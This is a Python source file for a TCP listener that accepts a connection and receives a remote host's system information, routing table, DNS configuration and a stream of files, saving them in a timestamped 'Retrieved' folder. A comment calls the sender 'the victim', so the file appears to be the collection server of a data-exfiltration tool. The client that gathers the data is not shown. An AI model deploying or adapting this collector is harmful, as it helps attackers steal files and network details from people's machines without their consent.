import json,socket,os, platform
from datetime import datetime

#Network variables initialization for connection to the client 
bufferSize = 65536
serverPort = 17703
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)

print("Waiting for connection")
connectionSocket,addr = serverSocket.accept()
print("Connection established")

#Reception and decoding of the messages sent by client
info = connectionSocket.recv(bufferSize).decode()
connectionSocket.send("TMB".encode())
infoJson = json.loads(info)

routingTable = connectionSocket.recv(bufferSize).decode()
connectionSocket.send("TMB".encode())
dns = connectionSocket.recv(bufferSize).decode()
connectionSocket.send("TMB".encode())


#Building the path of the direcotry to create based on OS and timestamp
serverOs = platform.system()
if(infoJson['platformInfo']['platform'] == "Windows"):
	if(serverOs == "Windows"):
		path = "Retrieved\\" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-version'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
		separator = "\\"
	else:
		path = r"Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-version'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
		separator = r"/"
else:
	if(serverOs == "Windows"):
		path = "Retrieved\\" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-release'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
		separator = "\\"
	else:
		path = r"Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-release'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
		separator = r"/"

#Creation of server's subdirectory if doesn't exist
if not os.path.isdir(path):
	try:
		os.makedirs(path)
		with open(path + separator + "SystemInformation.JSON", "w") as file:
			file.write(info)
	    
		with open(path + separator + "RoutingTable.txt", "w") as file:
			file.write(routingTable)
	    
		with open(path + separator + "DNS.txt", "w") as file:
			file.write(dns)
 
	except OSError:
		print ("Creation of the subdirectory \"{path}\" failed")
	
#Print of all the system information of the victim
print(info)
print(routingTable)
print(dns)

#Obtaining number of files to receive 
numFiles = int(connectionSocket.recv(bufferSize).decode())
connectionSocket.send("TMB".encode())

#Obtaining files from the Client
for i in range(numFiles):
	fileName = connectionSocket.recv(bufferSize).decode()
	connectionSocket.send("TMB".encode())
	fileSize = connectionSocket.recv(bufferSize).decode()
	connectionSocket.send("TMB".encode())

	print("Received new File: " + fileName + "\t" + fileSize + "B")  

	done = False

	with open (path + separator + fileName, "wb") as f:
		fileBytes = b""
		while not done:
			if fileBytes[-5:] == b"<TMB>":
				done = True
			else:
				data = connectionSocket.recv(bufferSize)
				fileBytes += data
		f.write(fileBytes[:-5])
		connectionSocket.send("TMB".encode())
connectionSocket.close()
